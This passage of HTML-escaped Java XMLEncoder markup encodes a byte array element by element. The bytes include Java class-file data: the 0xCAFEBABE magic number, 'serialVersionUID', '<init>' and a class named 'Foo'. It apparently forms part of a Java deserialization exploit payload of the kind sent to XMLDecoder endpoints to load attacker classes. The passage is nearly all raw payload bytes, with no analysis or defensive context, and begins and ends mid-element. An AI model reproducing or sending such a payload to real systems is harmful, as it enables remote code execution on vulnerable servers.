&lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="5671"&gt; &lt;byte&gt;27&lt;/byte&gt;&lt;/void&gt;&lt;void index="5673"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5675"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5679"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5683"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5687"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5688"&gt; &lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5692"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5694"&gt; &lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="5698"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5700"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5704"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5706"&gt; &lt;byte&gt;14&lt;/byte&gt;&lt;/void&gt;&lt;void index="5710"&gt; &lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="5712"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5716"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5718"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="5720"&gt; &lt;byte&gt;-111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5726"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5728"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="5730"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="5732"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5736"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5738"&gt; &lt;byte&gt;28&lt;/byte&gt;&lt;/void&gt;&lt;void index="5740"&gt; &lt;byte&gt;29&lt;/byte&gt;&lt;/void&gt;&lt;void index="5742"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5746"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5748"&gt; &lt;byte&gt;30&lt;/byte&gt;&lt;/void&gt;&lt;void index="5750"&gt; &lt;byte&gt;31&lt;/byte&gt;&lt;/void&gt;&lt;void index="5752"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5754"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5758"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5760"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5762"&gt; &lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="5764"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5766"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5768"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5770"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5772"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5776"&gt; &lt;byte&gt;-77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5778"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5780"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5784"&gt; &lt;byte&gt;-98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5785"&gt; &lt;byte&gt;-89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5787"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5788"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5789"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5790"&gt; &lt;byte&gt;-72&lt;/byte&gt;&lt;/void&gt;&lt;void index="5792"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5793"&gt; &lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5795"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5796"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5798"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5799"&gt; &lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5801"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="5802"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5803"&gt; &lt;byte&gt;57&lt;/byte&gt;&lt;/void&gt;&lt;void index="5804"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5806"&gt; &lt;byte&gt;61&lt;/byte&gt;&lt;/void&gt;&lt;void index="5807"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5808"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5809"&gt; &lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="5810"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="5811"&gt; &lt;byte&gt;-69&lt;/byte&gt;&lt;/void&gt;&lt;void index="5813"&gt; &lt;byte&gt;65&lt;/byte&gt;&lt;/void&gt;&lt;void index="5814"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5815"&gt; &lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5817"&gt; &lt;byte&gt;66&lt;/byte&gt;&lt;/void&gt;&lt;void index="5818"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5819"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5820"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5821"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5822"&gt; &lt;byte&gt;45&lt;/byte&gt;&lt;/void&gt;&lt;void index="5823"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5825"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="5826"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5827"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5828"&gt; &lt;byte&gt;-69&lt;/byte&gt;&lt;/void&gt;&lt;void index="5830"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5831"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5832"&gt; &lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5834"&gt; &lt;byte&gt;75&lt;/byte&gt;&lt;/void&gt;&lt;void index="5835"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5836"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5837"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5838"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5839"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5840"&gt; &lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5841"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5842"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5843"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5845"&gt; &lt;byte&gt;81&lt;/byte&gt;&lt;/void&gt;&lt;void index="5846"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5847"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5848"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5849"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5850"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5851"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5852"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5853"&gt; &lt;byte&gt;-67&lt;/byte&gt;&lt;/void&gt;&lt;void index="5855"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="5856"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5857"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5858"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5859"&gt; &lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="5860"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5861"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5863"&gt; &lt;byte&gt;91&lt;/byte&gt;&lt;/void&gt;&lt;void index="5864"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5865"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5866"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5867"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5868"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5869"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5870"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5872"&gt; &lt;byte&gt;95&lt;/byte&gt;&lt;/void&gt;&lt;void index="5873"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5874"&gt; &lt;byte&gt;-67&lt;/byte&gt;&lt;/void&gt;&lt;void index="5876"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5877"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5878"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5879"&gt; &lt;byte&gt;44&lt;/byte&gt;&lt;/void&gt;&lt;void index="5880"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5881"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5883"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5884"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5885"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5886"&gt; &lt;byte&gt;-72&lt;/byte&gt;&lt;/void&gt;&lt;void index="5888"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5889"&gt; &lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5891"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5892"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5894"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5895"&gt; &lt;byte&gt;-64&lt;/byte&gt;&lt;/void&gt;&lt;void index="5897"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="5898"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5900"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="5901"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5902"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5903"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5904"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5905"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5907"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="5908"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="5909"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5910"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5911"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5912"&gt; &lt;byte&gt;-69&lt;/byte&gt;&lt;/void&gt;&lt;void index="5914"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5915"&gt; &lt;byte&gt;89&lt;/byte&gt;&lt;/void&gt;&lt;void index="5916"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5917"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5918"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5920"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5921"&gt; &lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5923"&gt; &lt;byte&gt;122&lt;/byte&gt;&lt;/void&gt;&lt;void index="5924"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5926"&gt; &lt;byte&gt;-128&lt;/byte&gt;&lt;/void&gt;&lt;void index="5927"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5928"&gt; &lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5929"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5931"&gt; &lt;byte&gt;-125&lt;/byte&gt;&lt;/void&gt;&lt;void index="5932"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="5933"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5934"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5936"&gt; &lt;byte&gt;-121&lt;/byte&gt;&lt;/void&gt;&lt;void index="5937"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="5938"&gt; &lt;byte&gt;-119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5939"&gt; &lt;byte&gt;-74&lt;/byte&gt;&lt;/void&gt;&lt;void index="5941"&gt; &lt;byte&gt;-114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5942"&gt; &lt;byte&gt;-79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5946"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5948"&gt; &lt;byte&gt;-113&lt;/byte&gt;&lt;/void&gt;&lt;void index="5952"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5954"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5955"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5957"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5959"&gt; &lt;byte&gt;32&lt;/byte&gt;&lt;/void&gt;&lt;void index="5963"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5965"&gt; &lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="5967"&gt; &lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="5971"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5973"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5975"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5977"&gt; &lt;byte&gt;35&lt;/byte&gt;&lt;/void&gt;&lt;void index="5979"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="5981"&gt; &lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5982"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5983"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="5985"&gt; &lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="5987"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5990"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5991"&gt; &lt;byte&gt;-71&lt;/byte&gt;&lt;/void&gt;&lt;void index="5992"&gt; &lt;byte&gt;-54&lt;/byte&gt;&lt;/void&gt;&lt;void index="5993"&gt; &lt;byte&gt;-2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5994"&gt; &lt;byte&gt;-70&lt;/byte&gt;&lt;/void&gt;&lt;void index="5995"&gt; &lt;byte&gt;-66&lt;/byte&gt;&lt;/void&gt;&lt;void index="5999"&gt; &lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="6001"&gt; &lt;byte&gt;27&lt;/byte&gt;&lt;/void&gt;&lt;void index="6002"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="6004"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6006"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="6007"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6009"&gt; &lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="6010"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6012"&gt; &lt;byte&gt;24&lt;/byte&gt;&lt;/void&gt;&lt;void index="6013"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="6015"&gt; &lt;byte&gt;25&lt;/byte&gt;&lt;/void&gt;&lt;void index="6016"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6018"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="6019"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6020"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6021"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6022"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6023"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6024"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6025"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6026"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6027"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6028"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6029"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6030"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6031"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6032"&gt; &lt;byte&gt;85&lt;/byte&gt;&lt;/void&gt;&lt;void index="6033"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6034"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="6035"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6037"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6038"&gt; &lt;byte&gt;74&lt;/byte&gt;&lt;/void&gt;&lt;void index="6039"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6041"&gt; &lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="6042"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6043"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6044"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6045"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6046"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6047"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6048"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6049"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6050"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6051"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6052"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6053"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6054"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6055"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="6056"&gt; &lt;byte&gt;113&lt;/byte&gt;&lt;/void&gt;&lt;void index="6057"&gt; &lt;byte&gt;-26&lt;/byte&gt;&lt;/void&gt;&lt;void index="6058"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6059"&gt; &lt;byte&gt;-18&lt;/byte&gt;&lt;/void&gt;&lt;void index="6060"&gt; &lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="6061"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6062"&gt; &lt;byte&gt;71&lt;/byte&gt;&lt;/void&gt;&lt;void index="6063"&gt; &lt;byte&gt;24&lt;/byte&gt;&lt;/void&gt;&lt;void index="6064"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6066"&gt; &lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="6067"&gt; &lt;byte&gt;60&lt;/byte&gt;&lt;/void&gt;&lt;void index="6068"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6069"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6070"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6071"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6072"&gt; &lt;byte&gt;62&lt;/byte&gt;&lt;/void&gt;&lt;void index="6073"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6075"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6076"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="6077"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="6078"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6079"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6081"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6082"&gt; &lt;byte&gt;67&lt;/byte&gt;&lt;/void&gt;&lt;void index="6083"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6084"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="6085"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6086"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6088"&gt; &lt;byte&gt;15&lt;/byte&gt;&lt;/void&gt;&lt;void index="6089"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6090"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6091"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6092"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6093"&gt; &lt;byte&gt;78&lt;/byte&gt;&lt;/void&gt;&lt;void index="6094"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="6095"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="6096"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6097"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6098"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6099"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6100"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6101"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6102"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6103"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6104"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6106"&gt; &lt;byte&gt;18&lt;/byte&gt;&lt;/void&gt;&lt;void index="6107"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="6108"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6109"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="6110"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6111"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6112"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="6113"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6114"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="6115"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6116"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6117"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6118"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6119"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6120"&gt; &lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="6121"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="6122"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="6123"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="6124"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="6125"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6127"&gt; &lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="6128"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="6129"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="6130"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="6131"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="6132"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6134"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="6135"&gt; &lt;byte&gt;70&lt;/byte&gt;&lt;/void&gt;&lt;void index="6136"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6137"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="6138"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="6140"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="6141"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="6142"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="6143"&gt; 